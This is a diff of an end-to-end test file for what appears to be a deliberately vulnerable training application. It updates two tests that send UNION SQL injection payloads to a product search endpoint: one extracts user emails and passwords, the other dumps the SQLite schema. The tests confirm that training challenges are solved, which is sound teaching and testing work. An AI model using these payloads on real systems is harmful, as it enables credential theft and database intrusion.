@@ -33,7 +33,7 @@ describe('/#/search', () => {
 describe('/rest/products/search', () => {
   describe('challenge "unionSqlInjection"', () => {
     it('query param in product search endpoint should be susceptible to UNION SQL injection attacks', () => {
-      browser.driver.get(browser.baseUrl + '/rest/products/search?q=\')) union select null,id,email,password,null,null,null,null,null from users--')
+      browser.driver.get(`${browser.baseUrl}/rest/products/search?q=')) union select id,email,password,'4','5','6','7','8','9' from users--`)
     })
 
     protractor.expect.challengeSolved({ challenge: 'User Credentials' })
@@ -41,7 +41,7 @@ describe('/rest/products/search', () => {
 
   describe('challenge "dbSchema"', () => {
     it('query param in product search endpoint should be susceptible to UNION SQL injection attacks', () => {
-      browser.driver.get(browser.baseUrl + '/rest/products/search?q=\')) union select null,sql,null,null,null,null,null,null,null from sqlite_master--')
+      browser.driver.get(`${browser.baseUrl}/rest/products/search?q=')) union select sql,'2','3','4','5','6','7','8','9' from sqlite_master--`)
     })
 
     protractor.expect.challengeSolved({ challenge: 'Database Schema' })
